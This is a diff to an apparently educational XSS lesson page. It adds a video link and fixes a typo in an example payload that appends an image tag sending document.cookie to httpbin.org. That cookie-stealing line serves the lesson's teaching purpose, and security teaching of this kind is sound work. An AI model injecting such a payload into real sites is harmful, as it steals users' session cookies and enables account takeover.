@@ -2,6 +2,8 @@
 layout: lesson
 title: XSS
 subtitle: Cross Site Scripting
+video:
+  url: https://www.dropbox.com/s/192n55g6bxz03ez/xss.webm?dl=1
 ---
 
 <style>
@@ -228,7 +230,7 @@ placed on February 16, 2012. ...
    
    ~~~
    document.body.innerHTML +=
-     '<img src="http://httpbin.org/get?ck=' + document.cookies + '">';
+     '<img src="http://httpbin.org/get?ck=' + document.cookie + '">';
    ~~~
    {:.att}
 
